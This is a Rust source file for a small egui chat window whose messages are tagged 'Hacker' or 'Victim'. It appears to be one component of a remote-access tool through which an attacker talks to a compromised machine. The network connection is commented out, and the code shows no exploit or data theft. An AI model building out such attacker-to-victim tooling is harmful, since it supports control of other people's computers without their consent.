use std::sync::RwLock;

use egui::CentralPanel;
use lazy_static::lazy_static;

use crate::Connection;

// Chat will always use 4042 port
pub fn handle_chat(payload: &[u8], connection: &Connection) {
	// // let url = format!("ws://{}:{}", connection.ip, 4042);
	// let (socket, _) = connect(url).expect("Failed to connect");

	std::thread::spawn(move || {
		let chat = Chat::new();
		let options = eframe::NativeOptions::default();
		eframe::run_native(
			"Chat",
			options,
			Box::new(|_cc| Ok(Box::new(chat) as Box<dyn eframe::App>)),
		).unwrap();
	});
}
lazy_static! {
	static ref STATE : RwLock<Option<bool>> = RwLock::new(None);
}

#[derive(Clone)]
enum Sender {
	Hacker,
	Victim,
}

#[derive(Clone)]
struct Message {
	sender: Sender,
	text: String,
}

struct Chat {
	messages: RwLock<Vec<Message>>,
	new_message: String,
}
impl Chat {
	fn new() -> Self {
		Self {
			messages: RwLock::new(vec![]),
			new_message: "".to_string(),
		}
	}
	fn start(&self) {
		let state = STATE.read().unwrap();
		if state.is_none() {
			*STATE.write().unwrap() = Some(true);
		}
	}
	fn add_message(&mut self, sender: Sender, text: String) {
		let mut msgs = self.messages.write().unwrap();
		msgs.push(Message { sender, text });
	}
}

impl eframe::App for Chat {
	fn update(&mut self, ctx: &egui::Context, frame: &mut eframe::Frame) {
		CentralPanel::default().show(ctx, |ui| {
			// if !STATE.read().unwrap().unwrap() {
			// frame.quit();
			// }

			let messages = self.messages.read().unwrap().clone();

			egui::ScrollArea::vertical().show(ui, |ui| {
				for message in messages.iter() {
					let sender = match message.sender {
						Sender::Hacker => "Hacker",
						Sender::Victim => "Victim",
					};
					ui.label(format!("{}: {}", sender, message.text));
				}
			});

			ui.add_space(10.0);

			ui.with_layout(egui::Layout::bottom_up(egui::Align::Min), |ui| {
				ui.horizontal(|ui| {
					let available_width = ui.available_width();
					let text_edit_width = available_width * 0.9;
					let button_width = available_width * 0.1;
					
					ui.add_sized([text_edit_width, 20.0], egui::TextEdit::singleline(&mut self.new_message));

					if ui.add_sized([button_width, 20.0], egui::Button::new("Send")).clicked()
						&& !self.new_message.is_empty()
					{
						self.add_message(Sender::Victim, self.new_message.clone());
						self.new_message.clear();
					}
				});
			});
		});
	}
}